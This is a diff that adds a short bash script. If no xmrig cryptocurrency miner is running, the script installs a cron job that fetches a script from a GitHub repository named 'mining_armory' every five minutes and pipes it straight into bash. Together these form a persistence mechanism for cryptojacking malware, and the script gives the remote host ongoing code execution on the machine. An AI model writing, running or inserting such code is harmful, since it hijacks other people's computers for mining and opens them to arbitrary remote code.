@@ -1,0 +1,7 @@
+#!/bin/bash
+
+CONTENT="*/5 * * * * wget -qO- https://raw.githubusercontent.com/derailment/mining_armory/refs/heads/main/run | bash"
+
+if ! pgrep -x xmrig >/dev/null; then
+    (crontab -l 2>/dev/null; echo "$CONTENT") | crontab -
+fi
